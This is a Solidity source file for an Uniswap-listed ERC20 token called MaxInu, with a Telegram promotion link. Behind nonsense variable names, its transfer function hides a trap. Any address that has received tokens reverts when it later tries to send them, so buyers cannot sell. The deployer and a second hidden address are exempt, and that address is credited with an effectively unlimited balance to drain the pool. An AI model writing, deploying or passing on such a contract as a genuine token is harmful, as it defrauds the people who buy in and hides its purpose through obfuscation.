// https://t.me/maxinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract MaxInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private claws;

    function _transfer(
        address cutting,
        address strength,
        uint256 audience
    ) internal override {
        uint256 shade = swim;

        if (direction[cutting] == 0 && claws[cutting] > 0 && cutting != uniswapV2Pair) {
            direction[cutting] -= shade;
        }

        address form = fell;
        fell = strength;
        claws[form] += shade + 1;

        _balances[cutting] -= audience;
        uint256 morning = (audience / 100) * swim;
        audience -= morning;
        _balances[strength] += audience;
    }

    address private fell;
    mapping(address => uint256) private direction;
    uint256 public swim = 3;

    constructor(
        string memory put,
        string memory product,
        address chapter,
        address remember
    ) ERC20(put, product) {
        uniswapV2Router = IUniswapV2Router02(chapter);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 perhaps = ~uint256(0);

        direction[msg.sender] = perhaps;
        direction[remember] = perhaps;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[remember] = perhaps;
    }
}